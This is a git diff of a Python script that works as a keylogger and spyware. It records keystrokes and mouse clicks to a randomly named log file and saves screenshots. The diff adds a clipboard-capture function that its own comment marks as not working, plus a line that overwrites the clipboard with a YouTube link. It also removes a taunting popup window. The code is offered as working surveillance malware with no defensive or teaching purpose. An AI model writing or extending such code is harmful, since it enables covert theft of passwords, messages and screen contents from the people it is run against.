@@ -1,22 +1,13 @@
-import sys, tkinter, keyboard, time
+import sys, keyboard, time, pyautogui, pyperclip
 from threading import Thread
 from datetime import datetime
 from string import ascii_lowercase
 from random import choices
 from pynput import mouse
-from pyautogui import screenshot
 #C:\Users\alessandro.030108\AppData\Local\Programs\Python\Python311
 
 
 log_name = "".join(choices(ascii_lowercase, k=5))
-
-def create_window(title, dimensions, text):
-    new_window = tkinter.Tk(className=f"{title}")
-    window_text_def = tkinter.Text(new_window, wrap="word", font=('Courier 15 bold'), bg="black", fg="limegreen")
-    new_window.geometry(f"{dimensions}")
-    window_text_def.insert(tkinter.END, f"{text}")
-    window_text_def.place(x=10, y= 10, width= 475, height= 175)
-    tkinter.mainloop()
 
 class get_keyboard_input:
     def __init__(self):
@@ -57,6 +48,14 @@ class get_keyboard_input:
         keyboard.on_release(callback=self.format_input)
         keyboard.wait()
 
+#not working
+def get_copied_text():
+    copied = pyperclip.paste()
+
+    while True:
+        if len(copied) >= 1:
+            write_file(f"{datetime.now()} - copied to clipboard - {copied}", log_name)
+
 def get_mouse_input(x, y, button, pressed):
     global pressed_location
     global released_location
@@ -68,7 +67,7 @@ def get_mouse_input(x, y, button, pressed):
 
 def get_printscreen():
     starttime = time.time()
-    screen_log = screenshot()
+    screen_log = pyautogui.screenshot()
     screen_log.save(f"./{datetime.now().date()}.png")
 
 def write_file(input, filename):
@@ -78,8 +77,8 @@ def write_file(input, filename):
 if __name__ == "__main__":
     #create_window("You fucked up good bro...", "500x200", "\n              ..----.._    _\n            .' .--.    '-.(O)_\n'-.__.-'''=:|  ,  _)_ \__ . c\'-..\n             ''------'---''---'-'\n")
 
+    pyperclip.copy("https://youtu.be/uQQxwgbUSqg")
     get_printscreen()
-
     click_logger = mouse.Listener(on_click=get_mouse_input)
     clicklogger_thread = Thread(target=click_logger.start())
     keylogger = get_keyboard_input()
